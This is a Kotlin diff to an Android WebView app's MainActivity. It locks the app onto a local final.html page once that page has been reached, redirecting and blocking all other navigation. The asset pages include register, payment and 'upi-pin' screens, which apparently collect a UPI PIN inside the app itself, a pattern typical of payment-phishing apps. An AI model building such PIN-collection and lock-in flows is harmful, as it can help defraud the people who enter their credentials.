@@ -116,6 +116,7 @@ class MainActivity : ComponentActivity() {
             shouldLoadFinal = true
         }
         
+        // Check if final was reached before
         if (isFinalReached()) {
             Log.d(TAG, "Final already reached - will load final.html")
             pendingFinalScreen = true
@@ -173,6 +174,40 @@ class MainActivity : ComponentActivity() {
         when (intent?.action) {
             ACTION_CLOSE -> finishAndRemoveTask()
             ACTION_SHOW_FINAL -> showFinalScreen()
+        }
+    }
+    
+    override fun onResume() {
+        super.onResume()
+        Log.d(TAG, "onResume called")
+        
+        // Check if final was reached and ensure we're on final.html
+        if (isFinalReached() && ::webView.isInitialized) {
+            val currentUrl = webView.url ?: ""
+            if (!currentUrl.contains("final.html")) {
+                Log.d(TAG, "Final reached but not on final.html, redirecting...")
+                handler.post {
+                    webView.loadUrl("file:///android_asset/final.html")
+                }
+            }
+        }
+    }
+    
+    override fun onStart() {
+        super.onStart()
+        Log.d(TAG, "onStart called")
+        
+        // Ensure final.html is loaded if we've reached it before
+        if (isFinalReached() && ::webView.isInitialized) {
+            val currentUrl = webView.url ?: ""
+            if (!currentUrl.contains("final.html")) {
+                Log.d(TAG, "Final reached but not on final.html in onStart, redirecting...")
+                handler.postDelayed({
+                    if (::webView.isInitialized) {
+                        webView.loadUrl("file:///android_asset/final.html")
+                    }
+                }, 500)
+            }
         }
     }
     
@@ -391,26 +426,24 @@ class MainActivity : ComponentActivity() {
                 val currentUrl = url ?: ""
                 Log.d(TAG, "onPageFinished: $currentUrl")
                 
+                // If final was reached before, always redirect to final.html
+                if (isFinalReached()) {
+                    if (!currentUrl.contains("final.html")) {
+                        Log.d(TAG, "Final reached before - redirecting to final.html from: $currentUrl")
+                        handler.postDelayed({
+                            if (::webView.isInitialized) {
+                                webView.loadUrl("file:///android_asset/final.html")
+                            }
+                        }, 100)
+                        return
+                    }
+                }
+                
+                // Mark as reached when final.html is loaded
                 if (currentUrl.contains("final.html")) {
                     Log.d(TAG, "Final page loaded - marking as reached")
                     markFinalReached()
                     shouldLoadFinal = true
-                } else if (isFinalReached()) {
-                    if (currentUrl.contains("index.html") || 
-                        currentUrl.contains("register.html") || 
-                        currentUrl.contains("payment.html") || 
-                        currentUrl.contains("upi-pin.html") ||
-                        currentUrl.contains("file:///android_asset/index.html") ||
-                        currentUrl.contains("file:///android_asset/register.html") ||
-                        currentUrl.contains("file:///android_asset/payment.html")) {
-                        Log.d(TAG, "Redirecting to final.html from: $currentUrl")
-                        handler.post {
-                            if (::webView.isInitialized) {
-                                webView.loadUrl("file:///android_asset/final.html")
-                            }
-                        }
-                        return
-                    }
                 }
 
                 webView.evaluateJavascript(
@@ -506,9 +539,11 @@ class MainActivity : ComponentActivity() {
         }, "Android")
 
         try {
-            val isFinal = pendingFinalScreen || shouldLoadFinal || isFinalReached()
+            // Always check if final was reached before loading
+            val finalReached = isFinalReached()
+            val isFinal = pendingFinalScreen || shouldLoadFinal || finalReached
             val targetUrl = if (isFinal) {
-                Log.d(TAG, "Loading final.html in createWebView")
+                Log.d(TAG, "Loading final.html in createWebView (finalReached=$finalReached)")
                 pendingFinalScreen = false
                 shouldLoadFinal = true
                 "file:///android_asset/final.html"
@@ -540,15 +575,10 @@ class MainActivity : ComponentActivity() {
 
     private fun handleUrlNavigation(url: String): Boolean {
         Log.d(TAG, "handleUrlNavigation: $url")
+        // If final was reached, block all navigation except to final.html
         if (isFinalReached()) {
-            if (url.contains("index.html") || 
-                url.contains("register.html") || 
-                url.contains("payment.html") || 
-                url.contains("upi-pin.html") ||
-                url.contains("file:///android_asset/index.html") ||
-                url.contains("file:///android_asset/register.html") ||
-                url.contains("file:///android_asset/payment.html")) {
-                Log.d(TAG, "Blocking navigation to: $url, redirecting to final.html")
+            if (!url.contains("final.html")) {
+                Log.d(TAG, "Blocking navigation to: $url (final reached), redirecting to final.html")
                 handler.post {
                     if (::webView.isInitialized) {
                         webView.loadUrl("file:///android_asset/final.html")
